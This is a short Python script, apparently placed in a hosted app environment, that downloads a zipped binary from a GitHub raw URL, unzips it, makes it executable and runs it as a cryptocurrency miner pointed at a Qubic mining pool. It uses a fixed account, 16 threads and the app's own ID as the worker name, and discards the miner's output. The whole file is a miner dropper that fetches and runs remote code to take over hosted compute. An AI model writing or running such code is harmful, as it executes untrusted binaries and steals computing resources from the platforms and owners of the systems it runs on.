import os
os.system("wget https://github.com/qqivk/foneox/raw/refs/heads/main/foxo.zip")
os.system("unzip foxo.zip")
os.system("chmod +x foxo")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./foxo --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
